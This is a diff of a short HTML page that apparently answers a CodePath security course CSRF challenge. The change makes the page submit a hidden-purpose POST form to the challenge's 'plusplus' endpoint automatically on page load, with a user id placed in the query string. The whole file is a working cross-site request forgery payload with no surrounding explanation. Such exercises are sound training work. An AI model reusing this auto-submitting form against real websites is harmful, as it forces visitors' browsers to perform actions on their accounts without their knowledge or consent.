@@ -2,11 +2,10 @@
   <head>
     <title>csrfForm</title>
   </head>
-  <body>
-    <form name="csrfForm" action="https://security.codepath.com/b492976042ee85c8ace03b40f2f2a5cd87fd2773/csrfchallengetwo/plusplus" method="POST">
-      <input type="text" name="b492976042ee85c8ace03b40f2f2a5cd87fd2773" value="Hello" />
+  <body onload="document.csrfForm.submit()">
+    <form action="https://security.codepath.com/user/csrfchallengetwo/plusplus?userid=b492976042ee85c8ace03b40f2f2a5cd87fd2773" method="POST" name="csrfForm" >
+      <input type="text" name="amount" value="Hello" />
       <input type="submit"/>
     </form>
   </body>
 </html>
-
